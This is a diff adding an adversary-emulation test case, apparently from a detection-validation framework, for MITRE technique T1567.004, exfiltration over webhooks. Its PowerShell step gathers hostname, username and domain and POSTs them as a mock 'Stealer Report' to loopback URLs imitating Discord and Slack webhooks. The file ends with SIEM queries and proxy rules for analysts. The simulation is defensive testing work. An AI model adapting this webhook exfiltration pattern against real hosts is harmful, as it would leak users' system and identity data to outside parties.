@@ -1,0 +1,98 @@
+id: T1567.004_exfiltration_over_webhook
+name: "Exfiltration Over Web Service — Exfiltration Over Webhook"
+mitre_technique: "T1567.004"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data by posting to publicly accessible webhook endpoints
+  (Discord, Slack, Teams, webhook.site). Webhooks accept HTTP POST requests and
+  forward the payload to the configured destination — an adversary's Discord server,
+  Slack workspace, or custom endpoint. Traffic to these services is typically
+  allow-listed and blends with legitimate collaboration tool usage. Discord webhooks
+  are particularly popular in commodity malware (infostealers) due to ease of setup
+  and the permissive nature of Discord's API.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1567.004 — Webhook Exfiltration simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate Discord webhook exfiltration — infostealer pattern"
+    command: |
+      $payload = "$env:TEMP\PAS_T1567_004_payload.txt"
+      @"
+PAS-T1567.004-WEBHOOK-EXFIL
+Hostname: $env:COMPUTERNAME
+Username: $env:USERNAME
+Domain: $env:USERDOMAIN
+Time: $(Get-Date -Format o)
+"@ | Set-Content $payload
+
+      $content = Get-Content $payload -Raw
+      Write-Host "[PAS] Discord webhook POST pattern (loopback):"
+      Write-Host "[PAS] Real: POST https://discord.com/api/webhooks/<id>/<token>"
+
+      # POST to loopback mimicking Discord webhook
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/api/webhooks/PAS_FAKE_ID/PAS_FAKE_TOKEN")
+          $req.Method = "POST"
+          $req.ContentType = "application/json"
+          $req.Timeout = 300
+          $jsonBody = "{`"content`":`"``$content``\nStealer Report```,`"username`":`"PAS-Bot`"}"
+          $body = [Text.Encoding]::UTF8.GetBytes($jsonBody)
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Discord webhook POST to loopback generated"
+
+      Write-Host "[PAS] Slack webhook pattern:"
+      try {
+          $req2 = [System.Net.WebRequest]::Create("http://127.0.0.1/services/PAS/HOOK")
+          $req2.Method = "POST"
+          $req2.ContentType = "application/json"
+          $req2.Timeout = 300
+          $body2 = [Text.Encoding]::UTF8.GetBytes("{`"text`":`"$content`"}")
+          $req2.ContentLength = $body2.Length
+          $s = $req2.GetRequestStream(); $s.Write($body2,0,$body2.Length); $s.Close()
+          $req2.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Slack webhook POST to loopback generated"
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HTTP POST to discord.com/api/webhooks or slack.com/services from powershell.exe/cmd.exe"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove webhook exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1567_004_payload.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Webhook exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1567.004 cleanup complete"
+
+analyst_checklist:
+  - "Network event: POST to discord.com/api/webhooks or hooks.slack.com from scripting process"
+  - "Network event: POST to webhook.site from endpoint"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains ('discord.com/api/webhooks','hooks.slack.com','webhook.site') and InitiatingProcessFileName in ('powershell.exe','cmd.exe')"
+  - "MDE alert: 'Data exfiltration via webhook endpoint'"
+  - "CONTROL CHECK: Web proxy — flag scripting processes (powershell.exe) accessing discord.com; script→discord is almost never legitimate"
+  - "CONTROL CHECK: Discord/Slack at proxy — allowed for browser/app, blocked for scripting engines"
